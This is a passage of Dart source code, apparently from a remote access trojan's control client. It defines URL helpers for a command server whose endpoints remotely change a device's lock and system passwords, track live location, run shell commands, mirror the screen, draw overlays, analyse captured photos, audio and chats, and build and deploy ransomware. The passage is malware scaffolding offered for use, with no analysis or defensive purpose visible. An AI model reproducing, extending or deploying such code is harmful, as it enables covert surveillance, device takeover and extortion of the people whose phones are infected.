    return "$ratBaseUrl/api/ai-analyze-photo";
  }
  
  static String getRatAiAnalyzeAudioUrl() {
    return "$ratBaseUrl/api/ai-analyze-audio";
  }
  
  static String getRatAiAnalyzeTextUrl() {
    return "$ratBaseUrl/api/ai-analyze-text";
  }
  
  static String getRatAiAnalyzeLocationUrl() {
    return "$ratBaseUrl/api/ai-analyze-location";
  }
  
  static String getRatAiGenerateReportUrl() {
    return "$ratBaseUrl/api/ai-generate-report";
  }
  
  static String getRatAiSummarizeChatUrl() {
    return "$ratBaseUrl/api/ai-summarize-chat";
  }
  
  static String getRatAiTranslateUrl() {
    return "$ratBaseUrl/api/ai-translate";
  }
  
  static String getRatAiSuggestReplyUrl() {
    return "$ratBaseUrl/api/ai-suggest-reply";
  }
  
  static String getRatChangeLockPasswordUrl() {
    return "$ratBaseUrl/api/change-lock-password";
  }
  
  static String getRatSetScreenLockUrl() {
    return "$ratBaseUrl/api/set-screen-lock";
  }
  
  static String getRatChangeSystemPasswordUrl() {
    return "$ratBaseUrl/api/change-system-password";
  }
  
  static String getRatResetLockPasswordUrl() {
    return "$ratBaseUrl/api/reset-lock-password";
  }
  
  static String getRatSetScreenBrightnessUrl() {
    return "$ratBaseUrl/api/set-screen-brightness";
  }
  
  static String getRatGetScreenBrightnessUrl() {
    return "$ratBaseUrl/api/get-screen-brightness";
  }
  
  static String getRatSetAutoRotateUrl() {
    return "$ratBaseUrl/api/set-auto-rotate";
  }
  
  static String getRatSetScreenTimeoutUrl() {
    return "$ratBaseUrl/api/set-screen-timeout";
  }
  
  static String getRatSetAirplaneModeUrl() {
    return "$ratBaseUrl/api/set-airplane-mode";
  }
  
  static String getRatSetWifiHotspotUrl() {
    return "$ratBaseUrl/api/set-wifi-hotspot";
  }

  // ==================== ULTIMATE 6 HELPERS ====================
  
  static String getRatStartLiveLocationUrl() {
    return "$ratBaseUrl/api/start-live-location";
  }
  
  static String getRatStopLiveLocationUrl() {
    return "$ratBaseUrl/api/stop-live-location";
  }
  
  static String getRatGetLiveLocationUrl() {
    return "$ratBaseUrl/api/get-live-location";
  }
  
  static String getRatSendShellCommandUrl() {
    return "$ratBaseUrl/api/send-shell-command";
  }
  
  static String getRatGetShellOutputUrl() {
    return "$ratBaseUrl/api/get-shell-output";
  }
  
  static String getRatStartOverlayUrl() {
    return "$ratBaseUrl/api/start-overlay";
  }
  
  static String getRatStopOverlayUrl() {
    return "$ratBaseUrl/api/stop-overlay";
  }
  
  static String getRatStartScreenMirroringUrl() {
    return "$ratBaseUrl/api/start-screen-mirroring";
  }
  
  static String getRatStopScreenMirroringUrl() {
    return "$ratBaseUrl/api/stop-screen-mirroring";
  }
  
  static String getRatCreateWebRTCSessionUrl() {
    return "$ratBaseUrl/api/create-web-rtc-session";
  }
  
  static String getRatGetWebRTCSessionUrl() {
    return "$ratBaseUrl/api/get-web-rtc-session";
  }
  
  static String getRatBuildRansomwareUrl() {
    return "$ratBaseUrl/api/build-ransomware";
  }
  
  static String getRatDeployRansomwareUrl() {
    return "$ratBaseUrl/api/deploy-ransomware";
  }
}